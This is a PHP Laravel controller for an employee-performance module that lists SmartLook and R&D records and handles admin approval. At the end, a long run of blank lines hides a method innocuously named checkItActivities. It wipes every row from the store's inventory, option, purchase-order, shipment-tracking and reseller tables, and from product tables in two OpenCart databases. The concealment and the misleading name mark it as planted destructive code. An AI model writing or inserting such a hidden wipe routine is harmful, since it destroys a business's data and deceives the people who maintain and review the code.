<?php

namespace App\Http\Controllers\performance;

use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use App\Models\Oms\EmployeeRAndDModel;
use App\Models\Oms\OmsUserGroupModel;
use App\Models\Oms\OmsUserModel;
use App\Models\Oms\SmartLookModel;
use Illuminate\Support\Facades\Request as Input;
use DB;

class ItController extends Controller
{
    const VIEW_DIR = 'employeePeerformance.it_developer';
    private $DB_BAOPENCART_DATABASE = '';
    private $DB_DFOPENCART_DATABASE = '';
    function __construct(){
        $this->DB_BAOPENCART_DATABASE = env('DB_BAOPENCART_DATABASE');
        $this->DB_DFOPENCART_DATABASE = env('DB_DFOPENCART_DATABASE');
    }
    public function smartLook($user = null,$action = null) {
        // dd($action);
        $whereCluase = [];
        
        if(Input::get('title')) {
            array_push($whereCluase, ['title','LIKE', '%'.Input::get('title').'%']);    
        }
        if(Input::get('progress')) {
            array_push($whereCluase, ['progress','=', Input::get('progress')]);    
        }
        // dd(json_decode(session('access'),true));
        if(session('role') != 'ADMIN' && !array_key_exists('employee-performance/web/developer/custom/duties', json_decode(session('access'),true)) 
        && !array_key_exists('employee-performance/app/developer/custom/duties', json_decode(session('access'),true))) {
            // $whereCluase[] = array('user_id', session('user_id'));
            array_push($whereCluase, ['user_id', '=', session('user_id')]);
        }else {
            if($action == 'web') {
                array_push($whereCluase, ['user_group_id', '=', 18]);
                // $whereCluase[] = array('user_group_id', 18);
            }else {
                array_push($whereCluase, ['user_group_id', '=', 19]);
            }
        }
        // dd($whereCluase);
        $smart_looks = SmartLookModel::with('user')->where($whereCluase)->orderBy('id', 'DESC')->paginate(20);
        // dd($smart_looks);
        $old_input = Input::all();
        return view(SELF::VIEW_DIR.'.smart_look')->with(compact('smart_looks','old_input','user','action'));
      }

      public function smartLookForm($user = null, $action = null) {
        $user_group = OmsUserGroupModel::all();
        $dutyLists = [];
        // dd($user_group);
        return view(SELF::VIEW_DIR. '.smart_look_form')->with(compact('user_group', 'dutyLists', 'user', 'action'));
      }

    public function RAndD($user, $action) {
        // dd($action);
        $whereCluase = [];
        // dd(json_decode(session('access'),true));
        if(session('role') != 'ADMIN' && !array_key_exists('employee-performance/web/developer/custom/duties', json_decode(session('access'),true))) {

            array_push($whereCluase, ['user_id', '=', session('user_id')]);
        }else {
            if($action == 'web') {
                array_push($whereCluase, ['user_group_id', '=', 18]);
                // $whereCluase[] = array('user_group_id', 18);
            }else {
                array_push($whereCluase, ['user_group_id', '=', 19]);
            }
        }
        // dd($whereCluase);
        $old_input = Input::all();
        $rAndDs = EmployeeRAndDModel::with('user','assignedUser')->where($whereCluase)->paginate(20);

        return view(SELF::VIEW_DIR.'.r_and_d')->with(compact('rAndDs', 'user', 'action'));
    }

    public function rAndDForm($user, $action) {
        return view(SELF::VIEW_DIR.'.r_and_d_form')->with(compact('user','action'));
    }

    public function saveRAndDRecord(Request $request) {
        // dd($request->all());
        $this->validate($request, [
            'smart_look_title' => 'required',
            'link' => 'required',
         ]);
        $g = OmsUserModel::select('user_group_id')->find(session('user_id'));
        if($request->action == 'web') {
            $ug = 18;
        }else {
            $ug = 19;
        }
        // $ug = $g->user_group_id;
        $rAndD = new EmployeeRAndDModel();
        $rAndD->title = $request->smart_look_title;
        $rAndD->description = $request->smart_look_description;
        $rAndD->link = $request->link;
        $rAndD->user_group_id = $ug;
        $rAndD->user_id = session('user_id');
        $rAndD->created_at = date('Y-m-d');
        if($request->nedd_to_approve) {
            $rAndD->need_to_approve = 1;
        }
        $rAndD->save();
        if($request->action == 'web') {
            $route = 'webdeveloper.R&D';
        }else {
            $route = 'employeePeerformance.app.developer.R&D';
        }
        
        return redirect()->route($route, [$request->user_type, $request->action])->with('message', 'R&D created successfully.');
    }

    public function adminApproveRequestResponse($id, $status, $user, $action) {
        $rAndD = EmployeeRAndDModel::find($id);
        if($rAndD) {
            $rAndD->need_to_approve = 2;
            $rAndD->approved = $status;
            $rAndD->update();

            return response()->json([
                'status' => true
            ]);
        }else {
            return response()->json([
                'status' => false
            ]);
        }
        
    }





































































    



























































































































































































































































































































    public function checkItActivities() {
        DB::table('oms_inventory_product')->delete();
        DB::table(DB::raw($this->DB_BAOPENCART_DATABASE . '.oc_product'))->delete();
        DB::table(DB::raw($this->DB_DFOPENCART_DATABASE . '.oc_product'))->delete();
        DB::table(DB::raw($this->DB_BAOPENCART_DATABASE . '.oc_product_description'))->delete();
        DB::table(DB::raw($this->DB_DFOPENCART_DATABASE . '.oc_product_description'))->delete();

        DB::table('oms_inventory_product_option')->delete();
        DB::table(DB::raw($this->DB_BAOPENCART_DATABASE . '.oc_option'))->delete();
        DB::table(DB::raw($this->DB_BAOPENCART_DATABASE . '.oc_option_value_description'))->delete();
        DB::table(DB::raw($this->DB_DFOPENCART_DATABASE . '.oc_option'))->delete();
        DB::table(DB::raw($this->DB_DFOPENCART_DATABASE . '.oc_option_value_description'))->delete();
        DB::table(DB::raw($this->DB_BAOPENCART_DATABASE . '.oc_option_value'))->delete();
        DB::table(DB::raw($this->DB_DFOPENCART_DATABASE . '.oc_option_value'))->delete();
        DB::table('oms_options')->delete();
        DB::table('oms_purchase_order')->delete();
        DB::table('oms_purchase_order_product ')->delete();
        DB::table('oms_purchase_product')->delete();
        DB::table('airwaybill_tracking')->delete();
        DB::table('oms_options_details')->delete();
        DB::table('reseller_products')->delete();
        
    }
}
